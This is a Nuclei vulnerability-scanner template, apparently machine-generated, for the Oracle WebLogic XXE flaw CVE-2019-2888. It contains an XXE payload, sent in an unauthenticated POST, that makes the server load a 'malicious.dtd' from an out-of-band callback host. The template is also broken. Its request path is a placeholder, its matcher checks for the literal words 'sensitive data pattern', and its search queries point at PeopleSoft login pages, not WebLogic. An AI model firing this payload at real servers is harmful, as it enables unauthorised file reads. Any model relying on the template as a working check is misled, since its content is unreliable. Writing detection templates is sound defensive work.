id: CVE-2019-2888

info:
  name: Oracle WebLogic Server XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component EJB Container).
    Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0 and 12.2.1.3.0. Easily exploitable vulnerability
    allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful
    attacks of this vulnerability can result in unauthorized read access to a subset of Oracle WebLogic Server accessible data.
  impact: |
    An attacker could exploit this vulnerability to read arbitrary files on the server.
  remediation: |
    Apply the necessary patches provided by Oracle to mitigate the XXE vulnerability (CVE-2019-2888).
  reference:
    - https://github.com/lanmaovp-dev/shexiangshi-cm-YVJsF2HuAHndPiLB
    - https://github.com/wr0x00/Lsploit
    - https://github.com/xbl3/awesome-cve-poc_qazbnm456
    - https://github.com/hectorgie/PoC-in-GitHub
    - https://github.com/jas502n/CVE-2019-2888
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-2888
    epss-score: 0.00162
    epss-percentile: 0.54017
    cpe: cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*
  metadata:
    vendor: oracle
    product: weblogic_server
    shodan-query: product:"Oracle Weblogic"
    fofa-query: title="oracle peoplesoft sign-in"
    google-query: intitle:"oracle peoplesoft sign-in"

http:
  - method: POST
    path:
      - "{{BaseURL}}/path_to_vulnerable_component"

    headers:
      Content-Type: "application/xml"

    body: |
      <?xml version="1.0" encoding="ISO-8859-1"?>
      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/malicious.dtd">]>
      <foo>&xxe;</foo>
    matchers:
      - type: word
        words:
          - "sensitive data pattern"
        part: body
